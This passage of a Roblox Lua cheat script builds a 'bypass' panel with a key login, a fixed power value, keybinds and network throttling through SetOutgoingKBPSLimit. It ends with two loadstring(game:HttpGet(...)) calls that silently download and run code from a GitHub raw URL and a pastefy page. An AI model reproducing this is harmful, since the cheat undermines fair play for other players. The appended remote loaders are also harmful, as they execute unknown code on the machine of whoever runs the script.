	Size = UDim2.fromOffset(234, 30), Position = UDim2.fromOffset(8, 48),
	BackgroundColor3 = C.panel, BorderSizePixel = 0,
}, main)
corner(tabsFrame, 15)
stroke(tabsFrame, C.border, 1)
local pcButton = new("TextButton", {
	Size = UDim2.fromOffset(115, 26), Position = UDim2.fromOffset(2, 2),
	AutoButtonColor = false, Text = "PC", Font = Enum.Font.GothamBold, TextSize = 11,
	BackgroundColor3 = C.white, TextColor3 = C.blue, BorderSizePixel = 0,
}, tabsFrame)
corner(pcButton, 13)
local mobileButton = new("TextButton", {
	Size = UDim2.fromOffset(115, 26), Position = UDim2.fromOffset(117, 2),
	AutoButtonColor = false, Text = "MOBILE", Font = Enum.Font.GothamBold, TextSize = 11,
	BackgroundTransparency = 1, TextColor3 = C.gray, BorderSizePixel = 0,
}, tabsFrame)
corner(mobileButton, 13)

local statusLabel = new("TextLabel", {
	Size = UDim2.fromOffset(230, 12), Position = UDim2.fromOffset(10, 87),
	BackgroundTransparency = 1, Text = "BYPASS DISABLED", TextColor3 = C.dim,
	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
}, main)
local powerDisplay = new("TextButton", {
	Size = UDim2.fromOffset(234, 62), Position = UDim2.fromOffset(8, 102),
	BackgroundColor3 = C.graybg, AutoButtonColor = false, BorderSizePixel = 0,
	Text = "97K", TextColor3 = C.blue, Font = Enum.Font.GothamBlack, TextSize = 32,
}, main)
corner(powerDisplay, 12)
stroke(powerDisplay, C.outline, 1.5)

new("TextLabel", {
	Size = UDim2.fromOffset(250, 12), Position = UDim2.fromOffset(0, 169),
	BackgroundTransparency = 1, Text = "POWER FIXED · 97000", TextColor3 = C.dim,
	Font = Enum.Font.GothamMedium, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Center,
}, main)

new("TextLabel", {
	Size = UDim2.fromOffset(140, 12), Position = UDim2.fromOffset(10, 187),
	BackgroundTransparency = 1, Text = "BACKGROUNDS", TextColor3 = C.gray,
	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
}, main)
local bgButtons, bgStrokes = {}, {}
for i = 1, 3 do
	local x = 8 + (i - 1) * 81
	local b = new("TextButton", {
		Size = UDim2.fromOffset(72, 54), Position = UDim2.fromOffset(x, 202),
		BackgroundTransparency = 1, AutoButtonColor = false, BorderSizePixel = 0,
		Text = "", ClipsDescendants = true,
	}, main)
	corner(b, 10)
	local img = new("ImageLabel", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundTransparency = 1,
		Image = normalizeId(BACKGROUND_IMAGES[i]),
		ScaleType = Enum.ScaleType.Crop,
	}, b)
	corner(img, 10)
	bgStrokes[i] = stroke(b, C.border, 1)
	bgButtons[i] = b
end

new("TextLabel", {
	Size = UDim2.fromOffset(60, 12), Position = UDim2.fromOffset(10, 265),
	BackgroundTransparency = 1, Text = "SIZE", TextColor3 = C.gray,
	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
}, main)
local sizeValue = new("TextLabel", {
	Size = UDim2.fromOffset(92, 12), Position = UDim2.fromOffset(150, 265),
	BackgroundTransparency = 1, Text = "1.0", TextColor3 = C.blue,
	Font = Enum.Font.GothamBold, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Right,
}, main)
local sliderTrack = new("Frame", {
	Size = UDim2.fromOffset(TRACK_W, 4), Position = UDim2.fromOffset(10, 283),
	BackgroundColor3 = C.border, BorderSizePixel = 0,
}, main)
corner(sliderTrack, 2)
local sliderFill = new("Frame", {
	Size = UDim2.fromOffset(4, 4), BackgroundColor3 = C.white, BorderSizePixel = 0,
}, sliderTrack)
corner(sliderFill, 2)
local sliderKnob = new("Frame", {
	Size = UDim2.fromOffset(KNOB_S, KNOB_S), BackgroundColor3 = C.white, BorderSizePixel = 0,
}, sliderTrack)
corner(sliderKnob, 7)

local keybindLabel = new("TextLabel", {
	Size = UDim2.fromOffset(140, 12), Position = UDim2.fromOffset(10, 299),
	BackgroundTransparency = 1, Text = "KEYBIND", TextColor3 = C.gray,
	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
}, main)
local keybindButton = new("TextButton", {
	Size = UDim2.fromOffset(234, 34), Position = UDim2.fromOffset(8, 314),
	BackgroundColor3 = C.panel, AutoButtonColor = false, BorderSizePixel = 0,
	Text = DEFAULT_KEY.Name, TextColor3 = C.blue, Font = Enum.Font.GothamBold, TextSize = 12,
}, main)
corner(keybindButton, 10)
stroke(keybindButton, C.border, 1)

local activateButton = new("TextButton", {
	Size = UDim2.fromOffset(234, 38), Position = UDim2.fromOffset(8, 356),
	BackgroundColor3 = C.white, AutoButtonColor = false, BorderSizePixel = 0,
	Text = "ACTIVATE BYPASS", TextColor3 = C.black, Font = Enum.Font.GothamBold, TextSize = 13,
}, main)
corner(activateButton, 19)
local activateStroke = stroke(activateButton, C.white, 1.2)
activateStroke.Transparency = 1

local reopenButton = new("TextButton", {
	Size = UDim2.fromOffset(36, 36), Position = UDim2.new(1, -46, 1, -46),
	BackgroundColor3 = C.blue, AutoButtonColor = false, BorderSizePixel = 0,
	Text = "F", TextColor3 = C.black, Font = Enum.Font.GothamBlack, TextSize = 22,
	Visible = false,
}, gui)
corner(reopenButton, 18)

-- ═══════════════ STATE ═══════════════
local active = false
local FIXED_POWER = 97000
local currentScale = 1.0
local boundKey = DEFAULT_KEY
local waitingForKey = false
local minimized = false
local dragging, sliding = false, false
local dragStart, dragStartPos = nil, nil
local mobileMode = false

local function doLogout()
	clearSession()
	if active then setActive(false) end
	main.Visible = false
	creatorFrame.Visible = false
	reopenButton.Visible = false
	keyFrame.Visible = true
	keyBox.Text = ""
	keyStatus.Text = ""
end

logoutMain.Activated:Connect(doLogout)
logoutCreator.Activated:Connect(doLogout)

-- ═══════════════ KEY SUBMIT ═══════════════
submitKey.Activated:Connect(function()
	local input = keyBox.Text:gsub("%s+", "")
	local valid, keyType = isKeyValid(input)

	if not valid then
		keyStatus.Text = "Invalid or expired key"
		keyStatus.TextColor3 = C.red
		return
	end

	keyFrame.Visible = false

	if keyType == "vip" then
		creatorFrame.Visible = true
		refreshKeyList()
	else
		saveSession(input)
		main.Visible = true
	end
end)

-- ═══════════════ AUTO LOGIN ═══════════════
task.spawn(function()
	task.wait(0.15)
	local savedKey = loadSession()
	if savedKey then
		local valid, keyType = isKeyValid(savedKey)
		if valid and keyType == "normal" then
			keyFrame.Visible = false
			main.Visible = true
		else
			clearSession()
		end
	end
end)

-- ═══════════════ REST OF BYPASS ═══════════════
local function layoutSlider()
	local ratio = (currentScale - SIZE_MIN) / (SIZE_MAX - SIZE_MIN)
	local x = ratio * (TRACK_W - KNOB_S)
	sliderKnob.Position = UDim2.fromOffset(x, -5)
	sliderFill.Size = UDim2.fromOffset(math.max(4, x + KNOB_S / 2), 4)
end
local function setScaleFromX(px)
	local absX = sliderTrack.AbsolutePosition.X
	local w = sliderTrack.AbsoluteSize.X
	if w <= 0 then return end
	local ratio = math.clamp((px - absX) / w, 0, 1)
	currentScale = SIZE_MIN + ratio * (SIZE_MAX - SIZE_MIN)
	uiScale.Scale = currentScale
	sizeValue.Text = string.format("%.1f", currentScale)
	layoutSlider()
end
layoutSlider()

sliderTrack.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		sliding = true
		setScaleFromX(input.Position.X)
	end
end)

function setActive(state)
	active = state
	statusLabel.Text = state and "BYPASS ENABLED" or "BYPASS DISABLED"
	statusLabel.TextColor3 = state and C.blue or C.dim
	activateButton.Text = state and "DEACTIVATE BYPASS" or "ACTIVATE BYPASS"
	activateButton.BackgroundColor3 = state and C.panel or C.white
	activateButton.TextColor3 = state and C.blue or C.black
	activateStroke.Transparency = state and 0 or 1
	onBypassToggle(state, FIXED_POWER)
end
activateButton.Activated:Connect(function() setActive(not active) end)

local function selectTab(pc)
	mobileMode = not pc
	pcButton.BackgroundTransparency = pc and 0 or 1
	pcButton.TextColor3 = pc and C.black or C.gray
	mobileButton.BackgroundTransparency = pc and 1 or 0
	mobileButton.TextColor3 = pc and C.gray or C.black

	if mobileMode then
		keybindButton.Visible = false
		keybindLabel.Visible = false
		keybindButton.Active = false
	else
		keybindButton.Visible = true
		keybindLabel.Visible = true
		keybindButton.Text = boundKey.Name
		keybindButton.TextColor3 = C.blue
		keybindButton.BackgroundColor3 = C.panel
		keybindButton.Active = true
		keybindLabel.TextColor3 = C.gray
	end
end
pcButton.Activated:Connect(function() selectTab(true) end)
mobileButton.Activated:Connect(function() selectTab(false) end)
selectTab(true)

local function selectBg(i)
	for j = 1, 3 do
		if j == i then
			bgStrokes[j].Color = C.white
			bgStrokes[j].Thickness = 2
		else
			bgStrokes[j].Color = C.border
			bgStrokes[j].Thickness = 1
		end
	end
	mainBg.Image = normalizeId(BACKGROUND_IMAGES[i])
end
for i = 1, 3 do
	bgButtons[i].Activated:Connect(function() selectBg(i) end)
end
selectBg(3)

keybindButton.Activated:Connect(function()
	if mobileMode then return end
	waitingForKey = true
	keybindButton.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
		if mobileMode then
			waitingForKey = false
			keybindButton.Text = boundKey.Name
			return
		end
		boundKey = input.KeyCode
		keybindButton.Text = input.KeyCode.Name
		waitingForKey = false
		return
	end
	if waitingForKey then return end

	if not mobileMode and not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == boundKey then
			setActive(not active)
		end
	end
end)

minButton.Activated:Connect(function()
	minimized = not minimized
	minButton.Text = minimized and "+" or "-"
	TweenService:Create(main, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = minimized and UDim2.fromOffset(250, 46) or UDim2.fromOffset(250, 404),
	}):Play()
end)
closeButton.Activated:Connect(function()
	main.Visible = false
	reopenButton.Visible = true
end)
reopenButton.Activated:Connect(function()
	main.Visible = true
	reopenButton.Visible = false
end)

local function over(obj, p)
	local b = obj.AbsolutePosition
	local s = obj.AbsoluteSize
	return p.X >= b.X and p.X <= b.X + s.X and p.Y >= b.Y and p.Y <= b.Y + s.Y
end
header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		if over(minButton, input.Position) or over(closeButton, input.Position) then return end
		dragging = true
		dragStart = input.Position
		dragStartPos = main.Position
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if sliding then setScaleFromX(input.Position.X) end
		if dragging and dragStart then
			local delta = (input.Position - dragStart) / currentScale
			main.Position = UDim2.new(
				dragStartPos.X.Scale, dragStartPos.X.Offset + delta.X,
				dragStartPos.Y.Scale, dragStartPos.Y.Offset + delta.Y
			)
		end
	end
end)
UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
		dragStart = nil
		sliding = false
	end
end)

powerDisplay.Text = "97K"
setActive(false)

game:BindToClose(function()
	if active then
		stopSpamLoop()
		NetworkClient:SetOutgoingKBPSLimit(0)
	end
end)

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
end)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()